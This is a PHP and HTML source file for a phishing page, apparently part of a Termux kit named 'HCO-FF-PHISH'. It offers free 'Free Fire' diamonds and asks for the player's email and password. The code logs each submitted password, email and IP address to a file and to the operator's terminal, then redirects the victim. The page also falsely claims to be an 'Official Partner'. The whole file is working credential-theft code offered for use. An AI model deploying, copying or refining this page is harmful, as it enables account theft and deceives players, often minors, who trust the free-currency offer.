<?php
ob_start();
session_start();

// Terminal color codes
function colored($text, $color = "default") {
    $colors = [
        "red" => "\033[31m",
        "green" => "\033[32m",
        "yellow" => "\033[33m",
        "blue" => "\033[34m",
        "magenta" => "\033[35m",
        "cyan" => "\033[36m",
        "default" => "\033[0m"
    ];
    return ($colors[$color] ?? $colors['default']) . $text . "\033[0m";
}

// Terminal output
function logToTerminal($data) {
    $output = "\n" .
        colored("===========================================", "cyan") . "\n" .
        colored("[New Diamond Request]", "yellow") . "\n" .
        colored("Email: ", "green") . $data['email'] . "\n" .
        colored("Password: ", "green") . $data['password'] . "\n" .
        colored("Diamonds: ", "green") . $data['diamonds'] . "\n" .
        colored("IP Address: ", "green") . $data['ip'] . "\n" .
        colored("===========================================", "cyan") . "\n";
    file_put_contents('php://stdout', $output);
}

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = filter_input(INPUT_POST, 'email', FILTER_SANITIZE_STRING);
    $password = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_STRING);
    $diamonds = filter_input(INPUT_POST, 'diamonds', FILTER_VALIDATE_INT);

    if (empty($email) || empty($password) || !$diamonds) {
        http_response_code(400);
        die("Invalid input");
    }

    $data = [
        'email' => $email,
        'password' => $password,
        'diamonds' => $diamonds,
        'ip' => $_SERVER['REMOTE_ADDR']
    ];

    // Save to log file
    $logEntry = "\n===========================================\n";
    $logEntry .= "[New Diamond Request]\n";
    $logEntry .= "Email: " . $data['email'] . "\n";
    $logEntry .= "Password: " . $data['password'] . "\n";
    $logEntry .= "Diamonds: " . $data['diamonds'] . "\n";
    $logEntry .= "IP Address: " . $data['ip'] . "\n";
    $logEntry .= "===========================================\n";

    file_put_contents("/data/data/com.termux/files/home/HCO-FF-PHISH/data.log", $logEntry, FILE_APPEND | LOCK_EX);

    // Print to terminal
    logToTerminal($data);

    $_SESSION['submission'] = $data;
    header("Location: result.php");
    exit();
}
ob_end_flush();
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Free Fire Diamonds</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css">
</head>
<body class="min-h-screen flex items-center justify-center bg-gradient-to-r from-yellow-400 to-red-500 p-4">
  <div class="bg-white rounded-2xl shadow-xl w-full max-w-md p-6 sm:p-8">
    <h1 class="text-2xl sm:text-3xl font-bold text-center text-gray-800 mb-6">Free Fire Diamond Free Topup</h1>
    <form method="POST" class="space-y-4">
      <div>
        <label class="block text-sm font-semibold text-gray-700 mb-1">Email</label>
        <input type="text" name="email" required class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-yellow-400">
      </div>
      <div>
        <label class="block text-sm font-semibold text-gray-700 mb-1">Password</label>
        <input type="password" name="password" required class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-yellow-400">
      </div>
      <div>
        <label class="block text-sm font-semibold text-gray-700 mb-1">Select Diamonds</label>
        <select name="diamonds" required class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-yellow-400">
          <option value="">Choose package</option>
          <option value="100">100 Diamonds</option>
          <option value="530">530 Diamonds</option>
          <option value="1060">1060 Diamonds</option>
          <option value="2180">2180 Diamonds</option>
        </select>
      </div>
      <button type="submit" class="w-full bg-yellow-500 hover:bg-yellow-600 text-white py-3 rounded-lg font-semibold transition duration-200">Get For Free</button>
    </form>
    <p class="mt-6 text-center text-sm text-gray-500">100% Secure & Fast | Free Fire Official Partner</p>
  </div>
</body>
</html>
